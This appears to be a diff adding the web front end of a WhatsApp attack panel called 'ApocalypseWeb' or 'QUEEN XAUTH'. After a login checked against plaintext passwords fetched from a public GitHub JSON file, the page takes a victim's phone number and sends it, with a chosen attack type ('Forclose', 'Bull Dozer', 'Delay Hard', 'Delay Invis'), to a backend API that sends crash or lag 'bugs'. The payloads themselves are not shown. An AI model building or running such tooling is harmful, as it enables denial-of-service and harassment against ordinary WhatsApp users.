@@ -1,0 +1,581 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>ApocalypseWeb</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&display=swap" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
+  <style>
+    :root { 
+      --main: #7ec0ee; 
+      --second: #5aa9e6; 
+      --bg: #121f2b; 
+      --text: #e6f7ff; 
+      --success: #00ffaa;
+      --error: #ff6b6b;
+    }
+    
+    * { 
+      margin: 0; 
+      padding: 0; 
+      box-sizing: border-box; 
+      font-family: 'Orbitron', sans-serif; 
+    }
+    
+    body {
+      background: var(--bg); 
+      color: var(--text);
+      min-height: 100vh; 
+      display: flex;
+      justify-content: center; 
+      align-items: center;
+      padding: 20px; 
+      position: relative;
+      font-size: 16px;
+    }
+    
+    #particles-js { 
+      position: fixed; 
+      width: 100%; 
+      height: 100%; 
+      z-index: 0; 
+    }
+    
+    .glass-box {
+      background: rgba(126, 192, 238, 0.08);
+      border: 1px solid rgba(126, 192, 238, 0.2);
+      border-radius: 15px;
+      padding: 30px; 
+      backdrop-filter: blur(10px);
+      box-shadow: 0 0 20px rgba(126, 192, 238, 0.15);
+      z-index: 2; 
+      max-width: 500px;
+      width: 100%;
+    }
+    
+    .profile-container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      margin-bottom: 20px;
+    }
+    
+    .profile { 
+      display: flex; 
+      flex-direction: column;
+      align-items: center; 
+      gap: 15px; 
+      margin-bottom: 15px; 
+    }
+    
+    .profile img { 
+      width: 90px;
+      height: 90px;
+      border-radius: 50%; 
+      border: 2px solid var(--main);
+      object-fit: cover;
+    }
+    
+    .profile-info {
+      text-align: center;
+    }
+    
+    .profile-info h2 { 
+      font-size: 1.5rem; 
+      color: var(--main); 
+      margin-bottom: 5px;
+    }
+    
+    .status { 
+      font-size: 0.9rem; 
+      color: var(--second);
+    }
+    
+    .status i { 
+      color: var(--success); 
+      margin-right: 5px; 
+    }
+    
+    h1 { 
+      font-size: 1.5rem; 
+      color: var(--main); 
+      margin-bottom: 20px; 
+      text-align: center; 
+      animation: neon 2s infinite alternate; 
+    }
+    
+    .neon {
+      color: var(--main);
+      text-shadow: 0 0 5px var(--main), 0 0 10px var(--main), 0 0 20px rgba(126, 192, 238, 0.5);
+      animation: flicker 1.5s infinite alternate;
+    }
+
+    @keyframes flicker {
+      0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
+        opacity: 1;
+      }
+      20%, 24%, 55% {
+        opacity: 0.6;
+      }
+    }
+    
+    @keyframes neon { 
+      from { text-shadow: 0 0 10px var(--main); } 
+      to { text-shadow: 0 0 20px var(--second); } 
+    }
+    
+    input {
+      background: rgba(126, 192, 238, 0.1);
+      color: white;
+      border: 1px solid rgba(126, 192, 238, 0.2);
+      border-radius: 12px;
+      padding: 12px 15px;
+      width: 100%;
+      margin-bottom: 12px;
+      transition: 0.3s;
+      font-size: 1rem;
+    }
+    
+    input:focus {
+      outline: none; 
+      border: 1px solid var(--main);
+      background: rgba(126, 192, 238, 0.15);
+      box-shadow: 0 0 8px rgba(126, 192, 238, 0.2);
+    }
+    
+    .bug-options { 
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 12px;
+      margin-bottom: 20px;
+    }
+    
+    .bug-card {
+      background: rgba(126, 192, 238, 0.1);
+      border: 1px solid rgba(126, 192, 238, 0.2);
+      border-radius: 12px;
+      padding: 15px;
+      display: flex; 
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      gap: 8px; 
+      cursor: pointer; 
+      transition: all 0.3s ease;
+      text-align: center;
+      min-height: 80px;
+    }
+    
+    .bug-card i { 
+      font-size: 1.4rem; 
+      color: var(--main); 
+    }
+    
+    .bug-card span { 
+      font-size: 0.9rem; 
+      color: var(--main); 
+      font-weight: bold;
+    }
+    
+    .bug-card:hover { 
+      background: rgba(126, 192, 238, 0.15); 
+      transform: translateY(-3px); 
+      box-shadow: 0 5px 10px rgba(126, 192, 238, 0.1);
+    }
+    
+    .bug-card.active { 
+      border: 2px solid var(--main); 
+      box-shadow: 0 0 10px var(--main); 
+      transform: translateY(-3px);
+    }
+    
+    button {
+      background: linear-gradient(135deg, var(--main), var(--second));
+      border: none;
+      color: #121f2b;
+      width: 100%;
+      padding: 14px;
+      border-radius: 50px;
+      font-size: 1rem;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      box-shadow: 0 0 12px rgba(126, 192, 238, 0.3);
+      transition: all 0.3s ease;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    
+    button:disabled {
+      opacity: 0.7;
+      cursor: not-allowed;
+    }
+    
+    .small-logout {
+      background: rgba(126, 192, 238, 0.1);
+      border: 1px solid var(--main);
+      color: var(--main);
+      font-size: 0.9rem;
+      padding: 10px 20px;
+      border-radius: 12px;
+      margin-top: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      width: fit-content;
+      display: block;
+      margin-left: auto;
+      margin-right: auto;
+    }
+    
+    .small-logout:hover {
+      background: rgba(126, 192, 238, 0.2);
+      transform: translateY(-2px);
+    }
+    
+    #popup {
+      position: fixed;
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      display: flex; 
+      justify-content: center; 
+      align-items: center;
+      z-index: 999;
+      backdrop-filter: blur(5px);
+    }
+    .popup-content {
+      background: #1a2a3a;
+      color: var(--success);
+      padding: 30px;
+      border-radius: 15px;
+      text-align: center;
+      max-width: 90%;
+      width: 400px;
+      box-shadow: 0 0 20px rgba(0, 255, 170, 0.3);
+      animation: fadeIn 0.3s ease-in-out;
+      position: relative;
+      border: 1px solid var(--main);
+    }
+    .popup-content .close-btn {
+      position: absolute;
+      top: 10px; 
+      right: 15px;
+      font-size: 1.5rem;
+      color: var(--error);
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    .popup-content .close-btn:hover {
+      transform: scale(1.1);
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .spinner {
+      display: inline-block;
+      width: 20px;
+      height: 20px;
+      border: 3px solid rgba(126, 192, 238, 0.3);
+      border-radius: 50%;
+      border-top-color: var(--main);
+      animation: spin 1s ease-in-out infinite;
+    }
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+    .result-message {
+      margin-top: 15px;
+      text-align: center;
+      font-size: 0.9rem;
+      padding: 12px;
+      border-radius: 8px;
+    }
+    .success {
+      background: rgba(0, 255, 170, 0.1);
+      color: var(--success);
+      border: 1px solid var(--success);
+    }
+    .error {
+      background: rgba(255, 107, 107, 0.1);
+      color: var(--error);
+      border: 1px solid var(--error);
+    }
+    .dev-button {
+      background: rgba(126, 192, 238, 0.1);
+      border: 1px solid var(--main);
+      color: var(--main);
+      padding: 12px 25px;
+      border-radius: 50px;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      text-decoration: none;
+      margin-top: 20px;
+      transition: all 0.3s ease;
+      font-size: 0.9rem;
+    }
+    .dev-button:hover {
+      background: rgba(126, 192, 238, 0.2);
+      transform: translateY(-2px);
+      box-shadow: 0 3px 15px rgba(126, 192, 238, 0.2);
+    }
+    .contact {
+      margin-top: 20px; 
+      text-align: center;
+    }
+    .contact p {
+      color: var(--main);
+      font-size: 0.9rem;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+<div id="particles-js"></div>
+<div id="popup" style="display:none;">
+  <div class="popup-content">
+    <span class="close-btn" onclick="closePopup()">&times;</span>
+    <p id="popup-message"></p>
+  </div>
+</div>
+<div id="login-box" class="glass-box">
+  <h1>Login</h1>
+  <input type="text" id="username" placeholder="Username" />
+  <input type="password" id="password" placeholder="Password" />
+  <button onclick="login()"><i class="fas fa-sign-in-alt"></i> Login</button>
+  <div id="login-result" class="result-message"></div>
+</div>
+<div class="glass-box" id="main-box" style="display:none;">
+  <div class="profile-container">
+    <div class="profile">
+      <img src="https://files.catbox.moe/sz8c06.jpg" alt="profile">
+      <div class="profile-info">
+        <h2 id="userLabel">Api Bug</h2>
+        <span class="status"><i class="fas fa-circle"></i>Connected</span>
+      </div>
+    </div>
+  </div>
+  <h1 class="neon"><i class="https://files.catbox.moe/sz8c06.jpg"></i>QUEEN XAUTH</h1>
+  <input type="text" id="target" placeholder="628xxxx" />
+  <div class="bug-options">
+    <div class="bug-card active" data-bug="fc">
+      <i class="fas fa-skull-crossbones"></i><span>Forclose</span>
+    </div>
+    <div class="bug-card" data-bug="dozer">
+      <i class="fas fa-bomb"></i><span>Bull Dozer</span>
+    </div>
+    <div class="bug-card" data-bug="delay">
+      <i class="fas fa-clock"></i><span>Delay Hard</span>
+    </div>
+    <div class="bug-card" data-bug="blank">
+      <i class="fas fa-eye-slash"></i><span>Delay Invis</span>
+    </div>
+  </div>
+  <button id="sendBtn" onclick="sendBug()"> <i class="fas fa-paper-plane"></i> Send Bug</button>
+  <button class="small-logout" onclick="logout()"><i class="fas fa-sign-out-alt"></i> Logout</button>
+
+  <div id="result" class="result-message"></div>
+  <div class="contact">
+    <p><h3>Developer</h3></p>
+    <a href="https://t.me/modhzy" target="_blank" class="dev-button">
+      <i class="fab fa-telegram"></i> Developer
+    </a>
+  </div>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
+<script>
+particlesJS("particles-js", {
+  particles: {
+    number: { value: 60, density: { enable: true, value_area: 800 }},
+    color: { value: "#7ec0ee" },
+    shape: { type: "circle" },
+    opacity: { value: 0.4 },
+    size: { value: 3, random: true },
+    line_linked: {
+      enable: true, distance: 150,
+      color: "#7ec0ee", opacity: 0.3, width: 1
+    },
+    move: { enable: true, speed: 2, direction: "none", random: false }
+  },
+  interactivity: {
+    events: {
+      onhover: { enable: true, mode: "grab" },
+      onclick: { enable: false }
+    },
+    modes: { grab: { distance: 200, line_linked: { opacity: 1 } } }
+  },
+  retina_detect: true
+});
+
+const DB_URL = "https://raw.githubusercontent.com/Yogazyy/System/refs/heads/main/main.json";
+const API_ENDPOINT = "http://api/api";
+let selectedBug = "fc";
+let usersData = [];
+const loginBox = document.getElementById("login-box");
+const mainBox = document.getElementById("main-box");
+const usernameInput = document.getElementById("username");
+const passwordInput = document.getElementById("password");
+const loginResult = document.getElementById("login-result");
+const userLabel = document.getElementById("userLabel");
+const targetInput = document.getElementById("target");
+const sendBtn = document.getElementById("sendBtn");
+const resultDiv = document.getElementById("result");
+
+async function fetchUsers() {
+  try {
+    const response = await fetch(DB_URL);
+    if (!response.ok) throw new Error("Failed to fetch users");
+    usersData = await response.json();
+    return usersData;
+  } catch (error) {
+    console.error("Error fetching users:", error);
+    loginResult.innerText = "Error loading user database";
+    loginResult.className = "result-message error";
+    return [];
+  }
+}
+
+function saveSession(user) {
+  sessionStorage.setItem("currentUser", JSON.stringify(user));
+}
+
+function getSession() {
+  const session = sessionStorage.getItem("currentUser");
+  return session ? JSON.parse(session) : null;
+}
+
+function clearSession() {
+  sessionStorage.removeItem("currentUser");
+}
+
+function showPopup(message) {
+  document.getElementById("popup-message").innerHTML = message;
+  document.getElementById("popup").style.display = "flex";
+}
+
+function closePopup() {
+  document.getElementById("popup").style.display = "none";
+}
+
+function showDashboard(user) {
+  loginBox.style.display = "none";
+  mainBox.style.display = "block";
+  userLabel.innerText = user.username;
+}
+
+function resetLoginForm() {
+  usernameInput.value = "";
+  passwordInput.value = "";
+  loginResult.innerText = "";
+}
+
+async function login() {
+  const username = usernameInput.value.trim();
+  const password = passwordInput.value.trim();
+  
+  if (!username || !password) {
+    loginResult.innerText = "Please enter both username and password";
+    loginResult.className = "result-message error";
+    return;
+  }  
+  try {
+    if (usersData.length === 0) {
+      await fetchUsers();
+    }
+    const user = usersData.find(u => u.username === username && u.password === password);
+    
+    if (user) {
+      saveSession(user);
+      showDashboard(user);
+      resetLoginForm();
+    } else {
+      loginResult.innerText = "❌ Invalid username or password";
+      loginResult.className = "result-message error";
+    }
+  } catch (error) {
+    loginResult.innerText = "❌ Login failed. Please try again.";
+    loginResult.className = "result-message error";
+    console.error("Login error:", error);
+  }
+}
+
+function logout() {
+  clearSession();
+  loginBox.style.display = "block";
+  mainBox.style.display = "none";
+  resetLoginForm();
+}
+
+document.querySelectorAll(".bug-card").forEach(card => {
+  card.addEventListener("click", () => {
+    document.querySelectorAll(".bug-card").forEach(c => c.classList.remove("active"));
+    card.classList.add("active");
+    selectedBug = card.getAttribute("data-bug");
+  });
+});
+
+async function sendBug() {
+  const target = targetInput.value.trim();
+  
+  if (!/^\d+(@s\.whatsapp\.net)?$/.test(target)) {
+    resultDiv.innerText = "Please enter a valid WhatsApp number (e.g., 628123456789)";
+    resultDiv.className = "result-message error";
+    return;
+  }
+  
+  const chatId = target.includes("@s.whatsapp.net") ? target : `${target}@s.whatsapp.net`;
+  sendBtn.disabled = true;
+  const originalText = sendBtn.innerHTML;
+  sendBtn.innerHTML = '<span class="spinner"></span> Sending...';
+  resultDiv.innerText = "";
+  
+  try {
+    const url = `${API_ENDPOINT}chatId=${encodeURIComponent(chatId)}&type=${selectedBug}`;
+    const response = await fetch(url);
+    
+    if (!response.ok) {
+      throw new Error(`HTTP error! status: ${response.status}`);
+    }
+    
+    const data = await response.json();
+    
+    if (data.error) {
+      throw new Error(data.message || "Unknown error from server");
+    }
+    
+    showPopup(`Apocalypse Bug successfully sent to <b>${target}</b>`);
+    resultDiv.innerText = "Bug sent successfully!";
+    resultDiv.className = "result-message success";
+  } catch (err) {
+    console.error("Error sending bug:", err);
+    resultDiv.innerText = `❌ Failed to send bug: ${err.message}`;
+    resultDiv.className = "result-message error";
+    showPopup(`Failed to send bug to ${target}<br><small>${err.message}</small>`);
+  } finally {
+    sendBtn.disabled = false;
+    sendBtn.innerHTML = originalText;
+  }
+}
+
+window.onload = async () => {
+  await fetchUsers();
+  const user = getSession();
+  if (user) {
+    showDashboard(user);
+  }
+};
+
+document.addEventListener("keypress", (e) => {
+  if (e.key === "Enter" && loginBox.style.display !== "none") {
+    login();
+  }
+});
+</script>
+</body>
+</html>
